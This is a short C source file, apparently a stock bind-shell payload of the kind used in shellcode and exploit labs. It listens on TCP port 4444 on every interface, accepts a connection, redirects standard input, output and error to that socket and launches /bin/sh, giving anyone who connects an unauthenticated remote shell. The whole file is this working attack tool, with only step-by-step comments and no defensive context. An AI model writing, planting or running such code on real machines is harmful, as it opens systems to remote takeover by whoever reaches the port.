#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>


void main()
{

struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444); // Port
addr.sin_addr.s_addr = htonl(INADDR_ANY);

// Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    bind(sock, (struct sockaddr *) &addr, sizeof(addr));

    listen(sock,0);

    // Accept connection
    int fd = accept(sock, NULL, NULL);

    // Duplicate stdin/stdout/stderr to socket
    dup2(fd, 0); // stdin
    dup2(fd, 1); // stdout
    dup2(fd, 2); // stderr

    // Execute shell
    execve("/bin/sh", NULL, NULL);
}
